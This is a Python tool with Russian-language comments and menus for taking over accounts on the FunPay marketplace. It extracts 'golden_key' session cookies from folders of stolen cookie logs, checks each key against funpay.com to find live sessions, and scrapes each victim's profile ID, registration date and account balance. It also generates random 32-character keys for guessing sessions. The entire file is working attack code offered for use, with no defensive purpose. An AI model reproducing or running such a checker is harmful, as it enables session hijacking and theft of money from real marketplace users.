import os
import requests
import random
from bs4 import BeautifulSoup
from colorama import Fore

# Собирает все директории и проходится по всем файлам.txt в поиске строк содержащих сам сайт дальше разбивает строку по составляющим и сохраняет.
def cookieSearcher():
 directory = input("Перекиньте сюда папку с куками/вставьте путь до папки с куками:\n").replace('"', '')
 if len(directory) >= 3 and directory.find("\\") >= 1:
      directory_result = input("Введите название файла с результатом: ")
      good = 0
      os.system('CLS')
      for root, dirs, files in os.walk(directory):
          for filename in files:
              path = root+"\\"+filename
              if path.find(".txt") >= 1:
                 file = open(path, "r", encoding="UTF-8",errors='replace')
                 lines = file.readlines()
                 for line in lines:
                     if line.find("funpay.com	") or line.find("funpay.ru	") >=1:
                        if line.find("golden_key") >= 1:
                           good += 1
                           strg = line.split("	")
                           result = open(str(directory_result), 'a')
                           result.write(strg[6])
                           result.close
                 file.close
 else:
    print("Не правильный путь")
    input()
 print("Всего найдено: " + str(good))
 input()

#проходится по ключам и проверяет на то есть ли в коде страницы строка "Профиль".
def cookieCheacker():

    def mainRequest(key):
        cookie = f'golden_key={key};'
        response = requests.get('https://funpay.com/', headers={'cookie': cookie}, timeout=15)
        return response

    def idCheck(key):
        data = BeautifulSoup(mainRequest(key).text, 'lxml').find_all('div', class_='chat')
        for id in data:
            return id["data-user"]

    def regCheck(key):
        response = requests.get(f'https://funpay.com/users/{idCheck(key)}/', timeout=15)
        data = BeautifulSoup(response.text, 'lxml').find_all('div', class_='text-nowrap')
        for item in data:
            item = str(item).replace('<div class="text-nowrap">', "")
            item = str(item).replace('</div>', "")
            item = str(item).replace('<br/>', " ")
            return item

    def moneyCheck(key):
        cookie = f'golden_key={key};'
        response = requests.get('https://funpay.com/account/balance', headers={'cookie': cookie}, timeout=15)
        data = BeautifulSoup(response.text, 'lxml').find_all('span', class_='balances-list')
        moneylist = []
        for item in data:
            item = item.find_all('span', class_='balances-value')
            for item in item:
                moneylist.append(item.text.replace("\r\n", ','))
        return moneylist

    def mainCheck():
        keys = open(input("Перекиньте сюда файл с ключами/вставьте путь до файла с ключами: ").replace('"', ''), 'r').readlines()
        os.system('CLS')
        for key in keys:
            key = key.replace('\n', '')
            if mainRequest(key).text.find('Профиль') >= 1:
               id = idCheck(key)
               regdate = regCheck(key)
               money = moneyCheck(key)
               print(Fore.LIGHTGREEN_EX + f'Валидный : {str(key)} | https://funpay.com/users/{id}/ | Регистрация: {regdate} | Money = {money}\n')
            else:
                print(Fore.LIGHTRED_EX + f'Не валидный : {str(key)}')


    mainCheck()
    input()

#Генерирует из симбволов английского алфавита + цыфр 0-9 строки длиной в 33 симбвола.
def keyGenerator():
    combs = input("Кол-во комбинаций: ")
    file = open(input("Название файла куда сохранить: "), "a+")
    process = 0

    def characters():
        letter = "a b c d e f g h i j k l m n o p q r s t u v w x y z".split()
        chars = []
        chars.append(random.choice(letter))
        chars.append(str(random.randint(0, 9)))
        return chars

    def newkey(combs):
        word = characters()
        while len(word) < combs:
              word.append(random.choice(characters()))
        random.shuffle(word)
        return "".join(word)

    for n in range(int(combs)):
        file.write(newkey(32) + "\n")
        process += 1
        print(f"Сгенерировано: {process}")
    file.close()
    input()

#меню выбора функций.
def menu():
    choice = input("1. Парсер из файлов\n2. Чекер\n3. Генератор ключей\n")
    if choice == "1":
       cookieSearcher()
    elif choice == "2":
        cookieCheacker()
    elif choice == "3":
        keyGenerator()
    elif choice != "1" or "2" or "3":
         print("Не правильный выбор!")
         input()


menu()
